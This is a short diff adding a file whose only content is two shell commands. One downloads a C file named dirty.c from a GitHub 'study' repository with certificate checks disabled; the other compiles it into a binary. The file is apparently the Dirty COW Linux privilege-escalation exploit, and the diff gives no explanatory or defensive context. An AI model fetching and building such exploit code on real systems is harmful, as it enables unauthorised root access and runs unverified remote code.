@@ -1,0 +1,4 @@
+wget --no-check-certificate   https://raw.githubusercontent.com/Taind94/study/master/dirty.c
+
+
+gcc -pthread dirty.c -o dity -lcrypt
